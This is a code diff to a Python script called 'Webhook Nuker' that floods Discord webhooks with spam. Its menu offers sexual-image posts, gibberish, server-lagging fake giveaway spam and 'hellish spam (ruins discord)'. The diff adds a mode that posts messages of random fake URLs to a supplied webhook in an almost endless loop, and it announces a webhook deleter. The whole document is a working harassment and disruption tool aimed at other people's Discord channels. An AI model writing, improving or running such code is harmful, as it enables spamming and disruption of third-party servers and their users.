@@ -5,12 +5,15 @@ import random
 print('''
 
 Webhook Nuker
-v1.2.0 FMH
+v1.2.5 FMH
 
 1 = hentai hook (and normal)
 2 = jibberish spam
 3 = hellish spam (ruins discord)
 4 = fake gw spam (lags servers)
+5 = http url spam (why)
+6 = webhook deleter (not out yet)
+
 ''')
 maaain = input("Enter Number : ")
 if maaain =="1":
@@ -90,6 +93,33 @@ elif maaain =="4":
     if h.status_code == 429:    
        print(f"Rate Limited {h}")
     if h.status_code == 400:
-      print("More Then 200 Caracters Dectected!")    
+      print("More Then 2000 Caracters Dectected!")
+elif maaain =="5":
+  webhook = input("Enter The Full Webhook Url : ")
+  numm = int(9999999999)
+  for i in range(numm):
+    domain = random.choice(['.net','.com'])
+    urlz = random.choice(['people','family','apple','cart','shoe','pro','sports','home','smile','read','hat','boat'])
+    hb = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
+    domain2 = random.choice(['.net','.com'])
+    urlz2 = random.choice(['dog','cat','sex','file','text','map','tub','fly','mob','got','weed'])
+    hb2 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))       
+    domain3 = random.choice(['.net','.com'])    
+    hb3 = "".join(random.choice("abcdefghijklmnopqrstuvwxyz")for _ in range(1))
+    urlz3 = random.choice(['pop','job','bus','rod','new','music','mad','disk','ok','chat'])
+    name7 = "h"
+    stat1 = (f"https://{urlz}{hb}{domain}")
+    stat2 = (f"https://{urlz2}{hb2}{domain2}")
+    stat3 = (f"https://{urlz3}{hb3}{domain3}")
+    message = f"DNS GATEWAY : {stat1} - {stat2} - {stat3} " 
+  
+    h = requests.post(webhook, json={"content": str(message), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
+    time.sleep(.5)
+    print(f"Message Sent - {h}")
+    if h.status_code == 429:    
+       print(f"Rate Limited {h}")
+    
+  
 else:
   print("Invalid Responce")
+
